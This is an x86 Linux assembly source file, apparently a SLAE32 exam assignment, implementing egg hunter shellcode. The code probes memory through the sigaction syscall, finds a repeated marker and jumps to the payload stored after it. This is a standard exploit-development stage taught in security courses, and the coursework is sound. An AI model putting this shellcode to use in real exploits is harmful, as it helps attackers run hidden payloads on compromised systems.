; egg_hunter_sigaction_x86.nasm
; Author: Jack McBride (PA-6483)
; Website: https://jacklgmcbride.co.uk
;
; Purpose: SLAE32 exam assignment
;
; Assignment 3: Linux x86 Egg Hunter Shellcode

global _start

section .text

_start:


_loop_inc_page:

	or cx, 0xfff;			Go to last address in the memory page
	
_loop_inc_one:

	inc ecx;			Increment the memory counter by 1

_loop_check:
	
	push byte +0x43;		Push the syscall number 67 in hex to stack

	pop eax;			POP the syscall number to the EAX register

	int 0x80;			Execute sigaction() syscall

	cmp al, 0xf2;			Check if result is an access violation

_loop_check_valid:

	jz _loop_inc_page;		If access violation, jump to next page in memory
	
	
	mov eax, 0x50905090;		Move the egg pattern into EAX register

	mov edi, ecx;			Move the memory page to be scanned into EDI

	scasd;				Compare EAX and EDI for first half of egg
	
	jnz _loop_inc_one;		If no match, increment memory counter by one

	scasd;				Compare EAX and EDI for second half of egg
	
	jnz _loop_inc_one;		If no match, increment memory counter by one

_matched:
	
	jmp edi;			If match, jmp to memory address containing egg
